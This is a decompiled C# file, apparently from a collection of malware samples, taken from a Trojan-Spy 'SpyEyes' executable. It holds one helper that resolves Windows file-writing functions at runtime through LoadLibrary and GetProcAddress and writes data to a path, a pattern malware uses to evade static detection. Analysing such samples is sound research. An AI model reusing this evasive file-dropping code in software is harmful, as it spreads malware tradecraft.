// Decompiled with JetBrains decompiler
// Type: hRDPLaunch.API
// Assembly: hRDPLaunch, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 60607DF8-BFCA-47B6-95F1-C56512213E3C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.SpyEyes.bsrd-1ca0216d0d70df84f12b955ad54bc99c42b783320de730f7edb060aa4cf5e0cd.exe

using System;
using System.Runtime.InteropServices;

namespace hRDPLaunch
{
  public class API
  {
    public static bool WriteFunc(string path, byte[] data)
    {
      try
      {
        IntPtr hModule = Native.LoadLibrary("kernel32.dll");
        IntPtr procAddress1 = Native.GetProcAddress(hModule, "CreateFileW");
        if (procAddress1 == IntPtr.Zero)
          return false;
        IntPtr procAddress2 = Native.GetProcAddress(hModule, "WriteFile");
        if (procAddress2 == IntPtr.Zero)
          return false;
        IntPtr procAddress3 = Native.GetProcAddress(hModule, "CloseHandle");
        if (procAddress3 == IntPtr.Zero)
          return false;
        Native.myCloseFnc forFunctionPointer1 = (Native.myCloseFnc) Marshal.GetDelegateForFunctionPointer(procAddress3, typeof (Native.myCloseFnc));
        Native.MyOpenFunc forFunctionPointer2 = (Native.MyOpenFunc) Marshal.GetDelegateForFunctionPointer(procAddress1, typeof (Native.MyOpenFunc));
        Native.MyWriteFunc forFunctionPointer3 = (Native.MyWriteFunc) Marshal.GetDelegateForFunctionPointer(procAddress2, typeof (Native.MyWriteFunc));
        string filename = path;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        IntPtr hFile = forFunctionPointer2(filename, 4U, 0, zero1, 2, 128, zero2);
        uint lpNumberOfBytesWritten = 0;
        if (forFunctionPointer3(hFile, data, (uint) data.Length, out lpNumberOfBytesWritten, IntPtr.Zero))
        {
          int num = forFunctionPointer1(hFile) ? 1 : 0;
          return true;
        }
        int num1 = forFunctionPointer1(hFile) ? 1 : 0;
      }
      catch
      {
      }
      return false;
    }
  }
}
